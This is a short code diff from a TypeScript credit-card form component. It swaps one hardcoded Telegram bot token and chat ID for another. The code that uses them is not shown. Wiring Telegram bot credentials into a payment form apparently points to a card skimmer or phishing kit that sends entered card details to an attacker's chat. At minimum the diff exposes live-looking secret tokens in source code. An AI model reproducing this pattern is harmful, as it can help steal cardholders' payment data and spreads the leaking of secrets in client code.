@@ -18,8 +18,8 @@ type UserToken = {
   email: string;
 };
 
-const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw';
-const TELEGRAM_CHAT_ID = '7388576858';
+const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
+const TELEGRAM_CHAT_ID = '7860277201';
 
 interface CreditCardFormProps {
   totalAmount: number;
